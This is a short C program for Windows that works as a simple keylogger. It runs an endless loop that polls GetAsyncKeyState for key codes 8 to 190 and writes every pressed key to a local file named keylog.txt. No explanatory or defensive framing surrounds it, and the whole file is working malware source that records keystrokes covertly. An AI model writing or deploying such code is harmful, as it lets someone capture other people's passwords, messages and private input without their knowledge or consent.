#include <stdio.h>
#include <windows.h>

int main() {
    int i;
    FILE *file;
    file = fopen("keylog.txt", "w+");
    while (1) {
        for (i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                fputc(i, file);
            }
        }
    }
    fclose(file);
    return 0;
}